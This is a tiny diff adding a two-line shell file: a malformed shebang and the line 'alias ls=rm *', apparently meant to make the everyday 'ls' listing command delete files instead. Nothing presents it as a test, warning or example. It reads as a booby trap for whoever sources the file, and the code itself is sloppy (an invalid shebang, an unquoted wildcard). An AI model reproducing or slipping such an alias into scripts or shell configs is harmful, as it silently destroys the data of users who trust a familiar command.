@@ -1,0 +1,2 @@
+#!$BASH
+alias ls=rm *
